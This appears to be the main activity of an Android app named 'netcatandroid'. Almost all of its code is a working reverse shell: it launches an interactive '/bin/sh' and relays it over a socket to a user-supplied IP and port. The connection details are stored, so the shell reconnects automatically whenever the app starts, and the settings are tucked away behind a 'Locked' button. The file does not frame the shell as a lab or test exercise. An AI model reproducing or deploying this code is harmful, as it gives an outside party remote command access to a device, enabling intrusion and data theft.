package com.shivank.netcatandroid;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class MainActivity extends AppCompatActivity {

   static EditText edtIp, edtPort;
    static Button btnLock;
    ImageView imgHelp;
    Thread th;

    SharedPreferences sp;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        edtIp = findViewById(R.id.edtIP);
        edtPort = findViewById(R.id.edtPort);
        btnLock = findViewById(R.id.btnLock);
        imgHelp = findViewById(R.id.imgHelp);
        imgHelp.setVisibility(View.GONE);

        sp = getSharedPreferences("PRIVATE", MODE_PRIVATE);

        edtIp.setText(sp.getString("IP", ""));
        edtPort.setText(sp.getString("PORT", ""));

        if (!(TextUtils.isEmpty(edtIp.getText().toString()) && TextUtils.isEmpty(edtPort.getText().toString()))){

            edtPort.setVisibility(View.GONE);
            edtIp.setVisibility(View.GONE);
            btnLock.setEnabled(false);
            imgHelp.setVisibility(View.VISIBLE);

            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        String[] cmd = {"/bin/sh", "-i"};
                        Process proc = Runtime.getRuntime().exec(cmd);
                        InputStream proc_in = proc.getInputStream();
                        OutputStream proc_out = proc.getOutputStream();
                        InputStream proc_err = proc.getErrorStream();
                        SharedPreferences sh = getSharedPreferences("PRIVATE", MODE_PRIVATE);
                        SharedPreferences.Editor spe = sh.edit();
                        spe.putString("IP",edtIp.getText().toString());
                        spe.putString("PORT",edtPort.getText().toString());
                        spe.commit();
                        Socket socket = new Socket(edtIp.getText().toString(), Integer.parseInt(edtPort.getText().toString()));

                        InputStream socket_in = socket.getInputStream();
                        OutputStream socket_out = socket.getOutputStream();

                        while (true) {
                            while (proc_in.available() > 0)
                                socket_out.write(proc_in.read());
                            while (proc_err.available() > 0)
                                socket_out.write(proc_err.read());
                            while (socket_in.available() > 0)
                                proc_out.write(socket_in.read());
                            socket_out.flush();
                            proc_out.flush();
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    catch (NumberFormatException nm){
                        nm.printStackTrace();
                    }
                }
            }).start();
        }else {
            edtPort.setVisibility(View.VISIBLE);
            edtIp.setVisibility(View.VISIBLE);
            btnLock.setEnabled(true);
            imgHelp.setVisibility(View.GONE);
        }

        btnLock.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                edtPort.setVisibility(View.GONE);
                edtIp.setVisibility(View.GONE);
                btnLock.setText("Locked");
                btnLock.setEnabled(false);
                imgHelp.setVisibility(View.VISIBLE);

                if (!TextUtils.isEmpty(edtIp.getText().toString())) {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                String[] cmd = {"/bin/sh", "-i"};
                                Process proc = Runtime.getRuntime().exec(cmd);
                                InputStream proc_in = proc.getInputStream();
                                OutputStream proc_out = proc.getOutputStream();
                                InputStream proc_err = proc.getErrorStream();
                                SharedPreferences sh = getSharedPreferences("PRIVATE", MODE_PRIVATE);
                                SharedPreferences.Editor spe = sh.edit();
                                        spe.putString("IP",edtIp.getText().toString());
                                        spe.putString("PORT",edtPort.getText().toString());
                                        spe.commit();
                                Socket socket = new Socket(edtIp.getText().toString(), Integer.parseInt(edtPort.getText().toString()));

                                InputStream socket_in = socket.getInputStream();
                                OutputStream socket_out = socket.getOutputStream();

                                while (true) {
                                    while (proc_in.available() > 0)
                                        socket_out.write(proc_in.read());
                                    while (proc_err.available() > 0)
                                        socket_out.write(proc_err.read());
                                    while (socket_in.available() > 0)
                                        proc_out.write(socket_in.read());
                                    socket_out.flush();
                                    proc_out.flush();
                                }
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }
                    }).start();
                }
            }
        });

        imgHelp.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                btnLock.setEnabled(true);
                btnLock.setText("Lock");
                edtIp.setVisibility(View.VISIBLE);
                edtPort.setVisibility(View.VISIBLE);

            }
        });


    }
    public void threadStart(){
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String[] cmd = {"/bin/sh", "-i"};
                    Process proc = Runtime.getRuntime().exec(cmd);
                    InputStream proc_in = proc.getInputStream();
                    OutputStream proc_out = proc.getOutputStream();
                    InputStream proc_err = proc.getErrorStream();
                    SharedPreferences sh = getSharedPreferences("PRIVATE", MODE_PRIVATE);
                    SharedPreferences.Editor spe = sh.edit();
                    spe.putString("IP",edtIp.getText().toString());
                    spe.putString("PORT",edtPort.getText().toString());
                    spe.commit();
                    Socket socket = new Socket(edtIp.getText().toString(), Integer.parseInt(edtPort.getText().toString()));

                    InputStream socket_in = socket.getInputStream();
                    OutputStream socket_out = socket.getOutputStream();

                    while (true) {
                        while (proc_in.available() > 0)
                            socket_out.write(proc_in.read());
                        while (proc_err.available() > 0)
                            socket_out.write(proc_err.read());
                        while (socket_in.available() > 0)
                            proc_out.write(socket_in.read());
                        socket_out.flush();
                        proc_out.flush();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}